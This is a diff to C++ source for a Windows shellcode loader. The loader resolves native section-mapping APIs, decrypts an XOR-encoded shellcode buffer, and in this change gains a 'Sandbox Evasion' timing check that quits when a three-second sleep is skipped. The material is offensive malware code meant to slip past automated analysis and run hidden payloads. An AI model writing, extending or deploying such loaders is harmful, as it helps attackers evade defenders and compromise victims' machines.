@@ -1,6 +1,7 @@
 #include <iostream>
 #include <Windows.h>
 #include <vector>
+#include <time.h>
 
 typedef struct _UNICODE_STRING {
 	USHORT Length;
@@ -46,6 +47,10 @@ typedef enum _SECTION_INHERIT {
 using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
 	IN HANDLE ProcessHandle,
 	IN PVOID BaseAddress OPTIONAL);
+
+typedef void (WINAPI* SleepFunctionPointer)(
+	DWORD dwMilliseconds
+);
 
 char* Decrypt(char* rShellcode, int sShellcodeSize, unsigned char bKey) {
 
@@ -152,6 +157,7 @@ int main() {
 
 	// function import module
 	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+	HMODULE hUser = GetModuleHandle(L"kernel32.dll");
 
 	NtCreateSection ntCreateSection = (NtCreateSection)
 		GetProcAddress(hNtdll, "NtCreateSection");
@@ -161,6 +167,18 @@ int main() {
 
 	NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)
 		GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+
+	SleepFunctionPointer Sleep = (SleepFunctionPointer)
+		GetProcAddress(hUser, "Sleep");
+
+	// Sandbox Evasion
+	int start = (int)time(NULL);
+	Sleep(3000);
+	int stop = (int)time(NULL);
+
+	if ((stop - start) != 3){
+		return;
+	}
 
 	//char* shellcode = Decrypt(rShellcode, shellcodeSize, '"');
 	char* shellcode = Decrypt(rShellcode, shellcodeSize, '"');
